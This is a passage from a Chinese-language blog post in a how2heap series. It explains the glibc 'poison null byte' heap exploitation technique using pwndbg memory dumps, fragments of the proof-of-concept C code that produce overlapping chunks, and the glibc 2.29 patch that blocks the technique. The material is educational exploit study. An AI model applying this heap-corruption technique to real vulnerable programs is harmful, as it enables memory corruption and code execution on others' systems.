｜</span></span><br><span class="line"><span class="number">0x555555758110</span>:	<span class="number">0x00007ffff7dcdca0</span>	<span class="number">0x00007ffff7dcdca0</span>								｜</span><br><span class="line">......																				｜</span><br><span class="line"><span class="number">0x555555758160</span>:	<span class="number">0x0000000000000060</span>	<span class="number">0x0000000000000000</span>								｜</span><br><span class="line"><span class="number">0x555555758170</span>:	<span class="number">0x0000000000000a10</span>	<span class="number">0x0000000000000510</span> <span class="meta">#c(free)						｜</span></span><br><span class="line">......																				｜</span><br><span class="line"><span class="number">0x555555758680</span>:	<span class="number">0x0000000000000f20</span>	<span class="number">0x0000000000000110</span> <span class="meta">#barrier(malloc)--------------</span></span><br><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555757000</span></span><br><span class="line">Size: <span class="number">0x251</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555757250</span></span><br><span class="line">Size: <span class="number">0x511</span></span><br><span class="line"></span><br><span class="line"><span class="function">Free <span class="title">chunk</span> <span class="params">(unsortedbin)</span> | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x555555757760</span></span><br><span class="line"><span class="function">Size: 0xf21</span></span><br><span class="line"><span class="function">fd: 0x555555758100</span></span><br><span class="line"><span class="function">bk: 0x7ffff7dcdca0</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">Allocated chunk</span></span><br><span class="line"><span class="function">Addr: 0x555555758680</span></span><br><span class="line"><span class="function">Size: 0x110</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">Top chunk | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x555555758790</span></span><br><span class="line"><span class="function">Size: 0x1f871</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">pwndbg&gt;</span></span><br></pre></td></tr></table></figure>

<p>注意上面代码框中的内容，现在 b1 堆块的大小已经扩展到了 0xf21！！！<br>我们回头看看究竟是哪一步出现了问题：</p>
<ol>
<li>在 POC 的一开始我们创建了 4 个堆块，其名称和实际大小分别为 a==0x511，b==0xa11，c==0x511、barrier==0x111。</li>
<li>接下来假如存在 UAF 等漏洞修改 b 的 user_data 末尾（c 堆块的起始 0x10）为 0xa00，然后 free 掉 b 使其进入 unsortedbin。</li>
<li>然后使用单字节溢出漏洞将 b 的大小修改为 0xa00，此时 b 的大小减少了 0<br>x10（之前的修改是为了接下来申请绕过调用 unlink 时的检查）</li>
<li>之后申请实际大小为 0x500 的堆块（b1），这时会对在 unsortedbin 中的 b 堆块调用 unlink 进行解链切割</li>
<li>然后我们再次申请实际大小为 0x491 的堆块，这个堆块也会在 unsortedbin 中进行切割，分配之后的堆块称作 b2，我们将 b2 当作要收到攻击的堆块–victim</li>
<li>接下来 free b1 让其进入 unsortedbin 中，紧接着 free c 堆块，由于 c 堆块的 mchunk_prev_size==0xa10 且 c 的标志位 PREV_INUSE==0x0，<strong>并且 c 的 mchunk_prev_size==0xa10，因此会根据触发合并并依据 mchunk_prev_size 确定合并的大小。（漏洞所在）</strong></li>
<li>合并之后就会导致 a 的大小扩展到 0xf21，发生堆块重叠，现在可以为所欲为了。<blockquote>
<p><strong>触发合并的条件：堆块的 PREV_INUSE 标志位为 0（这一点可以通过堆溢出伪造）</strong></p>
</blockquote>
</li>
</ol>
<hr>
<p>这里再理清两个概念：</p>
<ul>
<li>向后合并：指当 free 某个堆块时，如果之前的一个堆块也处于 free 状态，则站在前一个堆块的立场来看堆块发生向后合并。</li>
<li>向前合并：指当 free 某个堆块时，如果之后的一个堆块也处于 free 状态，则站在后一个堆块的立场来看堆块发生向前合并。</li>
</ul>
<hr>
<p>为所欲为 ing：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Finally, we allocate &#x27;d&#x27;, overlapping &#x27;b2&#x27;.\n&quot;</span>);</span><br><span class="line">d = <span class="built_in">malloc</span>(<span class="number">0xc00</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;d: %p\n&quot;</span>,d);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now &#x27;d&#x27; and &#x27;b2&#x27; overlap.\n&quot;</span>);</span><br><span class="line"><span class="built_in">memset</span>(d,<span class="string">&#x27;D&#x27;</span>,<span class="number">0xc00</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;New b2 content:\n%s\n&quot;</span>,b2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks&quot;</span></span><br><span class="line">	<span class="string">&quot;for the clear explanation of this technique.\n&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="漏洞修补–glibc-2-29"><a href="#漏洞修补–glibc-2-29" class="headerlink" title="漏洞修补–glibc-2.29"></a>漏洞修补–glibc-2.29</h2><p>在全新的 glibc 2.29 的版本中，在“向后合并”时加入了检测机制，这导致我们无法滥用向后合并：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = prev_size (p);</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">    unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>放在内存中就是检测在释放 c 堆块向后合并堆块时：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">-------------------------------------------------------------------</span><br><span class="line"><span class="number">0x555555757760</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000511</span> #b1(<span class="built_in">malloc</span>)</span><br><span class="line">    								#检测<span class="number">2</span>:chunksize(p)==<span class="number">0x510</span></span><br><span class="line"><span class="number">0x555555757770</span>:	<span class="number">0x0000555555758100</span>	<span class="number">0x00007ffff7dcdca0</span> <span class="meta">#changed</span></span><br><span class="line">				<span class="meta">#fd					#bk</span></span><br><span class="line"><span class="number">0x555555757780</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span> <span class="meta">#changed</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757c70</span>:	<span class="number">0x0000000000000510</span>	<span class="number">0x0000000000000490</span> <span class="meta">#changed #b2(malloc)</span></span><br><span class="line"><span class="number">0x555555757c80</span>:	<span class="number">0x4242424242424242</span>	<span class="number">0x4242424242424242</span></span><br><span class="line"><span class="number">0x555555757c90</span>:	<span class="number">0x4242424242424242</span>	<span class="number">0x4242424242424242</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557580f0</span>:	<span class="number">0x4242424242424242</span>	<span class="number">0x4242424242424242</span></span><br><span class="line"><span class="number">0x555555758100</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000061</span> <span class="meta">#remainder(free-unsortedbin)</span></span><br><span class="line"><span class="number">0x555555758110</span>:	<span class="number">0x00007ffff7dcdca0</span>	<span class="number">0x00007ffff7dcdca0</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758160</span>:	<span class="number">0x0000000000000060</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555758170</span>:	<span class="number">0x0000000000000a10</span>	<span class="number">0x0000000000000510</span> <span class="meta">#c(free) 【malloc源码中的p堆块】</span></span><br><span class="line">				#检测<span class="number">1</span>【prevsize==<span class="number">0xa10</span>】</span><br><span class="line">                <span class="comment">//0x555555758170-0xa10==0x555555757760</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758680</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span> <span class="meta">#barrier(malloc)【malloc源码中的nextchunk】</span></span><br><span class="line">-------------------------------------------------------------------</span><br></pre></td></tr></table></figure>

<p>如上面代码框中的内容所示，很明显对两个堆块的不同位置进行了检查，这样我们就无法使用之前的攻击方式进行攻击。当然这种修补方式仍然可以绕过，这里先按下不表。</p>
<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">John Doe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2021/04/28/how2heap(6)-poison_null_byte/">http://example.com/2021/04/28/how2heap(6)-poison_null_byte/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/04/29/how2heap(5)-free%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB%EF%BC%88%E9%9D%9Emmap%EF%BC%89/"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">how2heap(5)-free源码解读（非mmap）</div></div></a></div><div class="next-post pull-right"><a href="/2021/04/27/how2heap(4)-tcache_house_of_spirit%EF%BC%88%E5%AF%B9%E4%B8%89%E4%B8%AA%E6%A0%87%E5%BF%97%E4%BD%8D%E7%9A%84%E7%A0%94%E7%A9%B6%E3%80%81%E5%86%85%E5%AD%98%E5%AF%B9%E9%BD%90%EF%BC%89/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">how2heap(4)-tcache_house_of_spirit（对三个标志位的研究、内存对齐）</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">John Doe</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">317</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">2.</span> <span class="toc-text">漏洞影响版本</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#POC"><span class="toc-number">3.</span> <span class="toc-text">POC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#POC-%E6%BA%90%E7%A0%81"><span class="toc-number">3.1.</span> <span class="toc-text">POC 源码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC-%E5%88%86%E6%9E%90"><span class="toc-number">3.2.</span> <span class="toc-text">POC 分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E8%A1%A5%E2%80%93glibc-2-29"><span class="toc-number">3.3.</span> <span class="toc-text">漏洞修补–glibc-2.29</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">4.</span> <span class="toc-text">例题</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/06/10/%E5%88%A9%E7%94%A8mprotect%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E6%AE%B5%E6%9D%83%E9%99%90%E4%B8%BA%E5%8F%AF%E6%89%A7%E8%A1%8C/" title="利用mprotect修改程序段权限为可执行"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="利用mprotect修改程序段权限为可执行"/></a><div class="content"><a class="title" href="/2021/06/10/%E5%88%A9%E7%94%A8mprotect%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E6%AE%B5%E6%9D%83%E9%99%90%E4%B8%BA%E5%8F%AF%E6%89%A7%E8%A1%8C/" title="利用mprotect修改程序段权限为可执行">利用mprotect修改程序段权限为可执行</a><time datetime="2021-06-10T07:59:46.000Z" title="Created 2021-06-10 15:59:46">2021-06-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/31/SROP%EF%BC%881%EF%BC%89--%E4%BB%8E%E4%B8%A4%E9%81%93%E9%A2%98%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86SROP%20attack/" title="SROP（1）--从两道题重新认识SROP attack"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SROP（1）--从两道题重新认识SROP attack"/></a><div class="content"><a class="title" href="/2021/05/31/SROP%EF%BC%881%EF%BC%89--%E4%BB%8E%E4%B8%A4%E9%81%93%E9%A2%98%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86SROP%20attack/" title="SROP（1）--从两道题重新认识SROP attack">SROP（1）--从两道题重新认识SROP attack</a><time datetime="2021-05-31T02:14:53.000Z" title="Created 2021-05-31 10:14:53">2021-05-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/18/how2heap(14)-unsortedbin%20attack/" title="how2heap(14)-unsortedbin attack"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="how2heap(14)-unsortedbin attack"/></a><div class="content"><a class="title" href="/2021/05/18/how2heap(14)-unsortedbin%20attack/" title="how2heap(14)-unsortedbin attack">how2heap(14)-unsortedbin attack</a><time datetime="2021-05-18T07:48:53.000Z" title="Created 2021-05-18 15:48:53">2021-05-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/17/how2heap(13)-tcache_stashing_unlink_attack/" title="how2heap(13)-tcache_stashing_unlink_attack"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="how2heap(13)-tcache_stashing_unlink_attack"/></a><div class="content"><a class="title" href="/2021/05/17/how2heap(13)-tcache_stashing_unlink_attack/" title="how2heap(13)-tcache_stashing_unlink_attack">how2heap(13)-tcache_stashing_unlink_attack</a><time datetime="2021-05-17T02:16:40.000Z" title="Created 2021-05-17 10:16:40">2021-05-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/14/how2heap(12)-house%20of%20lore/" title="how2heap(12)-house of lore"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="how2heap(12)-house of lore"/></a><div class="content"><a class="title" href="/2021/05/14/how2heap(12)-house%20of%20lore/" title="how2heap(12)-house of lore">how2heap(12)-house of lore</a><time datetime="2021-05-14T08:02:54.000Z" title="Created 2021-05-14 16:02:54">2021-05-14</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By John Doe</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>